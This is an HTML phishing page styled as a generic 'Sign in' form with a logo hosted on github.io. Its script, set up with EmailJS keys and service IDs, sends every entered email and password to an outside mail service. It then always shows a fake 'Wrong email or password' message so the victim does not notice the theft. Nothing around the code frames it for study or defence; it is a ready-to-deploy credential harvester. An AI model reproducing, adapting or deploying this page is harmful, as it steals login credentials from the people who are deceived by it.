<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in</title>

  <link rel="icon" type="image/png" href="https://img.icons8.com/ios-filled/50/000000/lock--v1.png">

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      background: #f6f6f6;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    #page-loader {
      position: fixed;
      inset: 0;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 9999;
      transition: opacity .6s ease;
    }

    #page-loader.fade-out { opacity: 0; pointer-events: none; }

    #page-loader .spinner {
      width: 42px;
      height: 42px;
      border: 4px solid #e0e0e0;
      border-top: 4px solid #ff8a80;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .container {
      width: 100%;
      max-width: 380px;
      padding: 32px 22px 26px;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0,0,0,.08);
      text-align: center;
      opacity: 0;
      transform: translateY(20px);
      transition: .6s ease;
    }

    .container.visible { opacity: 1; transform: translateY(0); }

    .logo {
      width: 64px;
      height: 64px;
      margin: 0 auto 10px;
    }

    h2 {
      margin: 6px 0 20px;
      font-size: 22px;
      font-weight: 600;
      color: #444;
    }

    .field {
      display: flex;
      align-items: center;
      background: #f2f2f2;
      border-radius: 10px;
      padding: 0 12px;
      margin-bottom: 14px;
    }

    .field img {
      width: 18px;
      opacity: .55;
      margin-right: 8px;
    }

    .field input {
      border: none;
      outline: none;
      background: transparent;
      height: 44px;
      width: 100%;
      font-size: 14px;
      color: #333;
    }

    button {
      width: 100%;
      height: 46px;
      border: none;
      border-radius: 12px;
      background: #ffb3a7;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .links {
      margin-top: 18px;
      display: flex;
      justify-content: space-between;
      font-size: 13px;
    }

    .links a { color: #4da3ff; text-decoration: none; }

    .error-message {
      margin-top: 10px;
      font-size: 13px;
      color: #ff5252;
      display: none;
    }

    .loading-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,.9);
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .loading-overlay .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #e0e0e0;
      border-top: 4px solid #ff8a80;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    @media (max-width: 420px) {
      .container { border-radius: 0; min-height: 100vh; box-shadow: none; }
    }
  </style>
</head>
<body>

<div id="page-loader">
  <div class="spinner"></div>
</div>

<div class="container" id="main-container">
  <img class="logo" src="https://zer0-0ne-zer0.github.io/0/cppluslogo.png" alt="logo">
  <h2>Sign in</h2>

  <form id="login-form">
    <div class="field">
      <img src="https://img.icons8.com/ios-glyphs/30/user--v1.png">
      <input type="text" id="email" placeholder="Enter email/username" required>
    </div>

    <div class="field">
      <img src="https://img.icons8.com/ios-glyphs/30/lock--v1.png">
      <input type="password" id="password" placeholder="Enter password" required>
    </div>

    <button type="submit">Sign in</button>
    <div class="error-message" id="error-msg">Wrong email or password</div>
  </form>

  <div class="links">
    <a href="#">Sign up</a>
    <a href="#">Forgot password?</a>
  </div>
</div>

<div class="loading-overlay" id="loading-screen">
  <div class="spinner"></div>
</div>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  /* ðŸ”’ ORIGINAL JS â€” NOT MODIFIED */
  emailjs.init("Zuxy6x2TZlxuZ4ABj");

  document.addEventListener("DOMContentLoaded", () => {
    const pageLoader = document.getElementById("page-loader");
    const container = document.getElementById("main-container");

    setTimeout(() => {
      pageLoader.classList.add("fade-out");
      setTimeout(() => container.classList.add("visible"), 400);
    }, 1200);

    const form = document.getElementById("login-form");
    const loader = document.getElementById("loading-screen");
    const errorMsg = document.getElementById("error-msg");

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      loader.style.display = "flex";

      emailjs.send("service_z1uzh6f", "template_whed5zh", {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value
      }).then(() => {
        loader.style.display = "none";
        errorMsg.style.display = "block";
      }).catch(() => loader.style.display = "none");
    });
  });
</script>
</body>
</html>
